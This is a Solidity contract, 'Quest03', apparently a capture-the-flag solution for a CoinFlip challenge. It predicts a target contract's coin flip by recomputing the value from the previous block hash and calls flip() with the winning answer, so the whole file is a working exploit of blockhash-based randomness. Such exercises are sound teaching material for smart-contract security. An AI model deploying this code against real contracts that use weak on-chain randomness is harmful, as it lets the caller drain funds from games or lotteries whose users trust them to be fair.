//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

// interface CoinFlipI {
// function flip(bool) external returns (bool);
// }

contract Quest03 {
    using SafeMath for uint256;
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    address public owner;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this function");
        _;
    }

    function guess(address coinFlipAddress) public onlyOwner {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        //CoinFlipI(coinFlipAddress).flip(side);
        bytes memory payload = abi.encodeWithSignature("flip(bool)", side);

        (bool success, bytes memory returnData) = coinFlipAddress.call(payload);
        require(success, "CoinFlip contract call failed");

        bool consecutiveWins = abi.decode(returnData, (bool));
        require(consecutiveWins, "CoinFlip flip() not win");
    }
}
